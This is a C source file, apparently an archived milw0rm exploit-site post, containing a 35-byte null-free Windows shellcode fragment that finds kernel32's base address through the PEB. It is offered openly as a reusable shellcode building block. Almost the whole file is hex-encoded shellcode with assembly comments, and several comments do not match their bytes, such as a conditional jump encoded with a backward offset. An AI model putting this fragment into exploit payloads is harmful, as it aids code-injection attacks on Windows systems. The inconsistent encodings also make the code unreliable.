/*This is a 35 byte C implementation of the use of the PEB method to get
*the kernel32 base address on Windows. This is generic code designed to
*run on both Windows 9x and NT based systems. The code has been optimized
*to not have any 00h bytes so that you wont have to use an XOR routine to
*encode the shellcode. I used relative jumps and xor tricks to avoid the
*00h bytes and make the code as small as I could get it. Feel free to use
*this source in anything that you want.
*/


/* 35 byte PEB method for Windows 9x/NT/2k/XP
*  0x00 byte optimized, no XOR routine required.
*
*  www.4x10m.com
*  oc.192
*  irc.4x10m.net #4x10m
*/

unsigned char shellcode[] =
/*  35 byte PEB - 00h removal and size optimized  */
/*      22 - 24 total clock cycles on a x486      */
"\x31\xC0"                  /* xor eax, eax       */
"\x31\xD2"                  /* xor edx, edx       */
"\xB2\x30"                  /* mov dl, 30h        */
"\x64\x8B\x02"              /* mov eax, [fs:edx]  */      /* PEB base address */
"\x85\xC0"                  /* test eax, eax      */
"\x78\xC0"                  /* js 0Ch             */
"\x8B\x40\x0C"              /* mov eax, [eax+0Ch] */      /* NT kernel32 routine */
"\x8B\x70\x1C"              /* mov esi, [eax+1Ch] */
"\xAD"                      /* lodsd              */
"\x8B\x40\x08"              /* mov eax, [eax+08h] */
"\xEB\x07"                  /* jmp short 09h      */
"\x8B\x40\x34"              /* mov eax, [eax+34h] */      /* 9x kernel32 routine */
"\x8D\x40\x7C"              /* lea eax, [eax+7Ch] */
"\x8D\x40\x3C"              /* mov eax, [eax+3Ch] */
;

int main(int argc, char *argv[]) {
      //void (*sc)() = (void *)shellcode;
      printf("len:%d\n", sizeof(shellcode));
      //sc();
      return 0;
}

// milw0rm.com [2005-01-09]